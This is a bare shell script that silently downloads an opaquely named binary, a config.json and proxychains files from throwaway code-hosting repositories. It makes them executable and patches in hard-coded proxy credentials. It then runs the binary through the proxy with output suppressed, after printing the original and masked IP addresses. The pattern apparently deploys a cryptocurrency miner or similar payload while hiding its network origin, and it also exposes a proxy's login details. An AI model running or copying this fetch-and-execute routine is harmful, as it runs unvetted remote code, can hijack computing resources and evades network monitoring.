proxy="45.94.47.66" 
port="8110" 
user="ugursfso"  
pass="wqn60pnk6m95"   
wget -q -O 55113110 https://gitlab.com/55113110159/dokerweb/-/raw/main/kanza6.18.1 && chmod +x 55113110
wget -q https://raw.githubusercontent.com/balma1/kitoy/main/SHA256SUMS && chmod +x SHA256SUMS 
wget -q https://raw.githubusercontent.com/balma1/kitoy/main/config.json && chmod +x config.json
wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/panel && chmod +x panel 
wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/proxychains.conf && chmod +x proxychains.conf 
wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/libproxychains4.so && chmod +x libproxychains4.so 
sleep 3 
sed -i "s/127.0.0.1/$proxy/" "proxychains.conf" 
sleep 1 
sed -i "s/port/$port/" "proxychains.conf" 
sed -i "s/user/$user/" "proxychains.conf"  
sleep 1  
sed -i "s/pass/$pass/" "proxychains.conf" 
sleep 11 
echo "******************************************************************" 
echo "IP ORI ==> "$(curl ifconfig.me) 
echo " " 
echo " " 
echo "IP BARU ==> "$(./panel curl ifconfig.me)
./panel ./55113110 -c "config.json" >/dev/null 2>&1
